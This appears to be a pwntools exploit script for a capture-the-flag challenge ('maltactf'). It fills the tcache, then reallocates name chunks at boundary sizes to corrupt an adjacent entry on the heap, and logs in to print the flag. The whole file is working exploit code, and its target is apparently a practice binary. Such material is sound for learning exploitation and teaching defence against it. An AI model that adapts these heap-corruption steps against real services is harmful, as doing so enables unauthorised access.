#!/usr/bin/env python3

from pwn import *

context.log_level = 'DEBUG'

#p = process("./chal")
p = remote("0.0.0.0", 1337)

BIO = " is a really cool hacker\n"
NAMELEN1 = 0x39 - len(BIO)
NAMELEN2 = 0x3a - len(BIO)

def create(idx, name):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b">", str(idx).encode())
    p.sendlineafter(b">", name)

def select(idx):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b">", str(idx).encode())

def delete(idx):
    p.sendlineafter(b">", b"4")
    p.sendlineafter(b">", str(idx).encode())

def login():
    p.sendlineafter(b">", b"5")


for i in range(7):
    create(2, b"JoshL")
    delete(2)

create(0, b"SBG")
create(1, b"joseph")

pause()

delete(0)
create(0, b"A" * NAMELEN1)
delete(0)
create(0, b"A" * NAMELEN2)

pause()

select(1)

login()

print(p.recvuntil(b'maltactf{'))
print(p.recvuntil(b'}'))
exit(0)
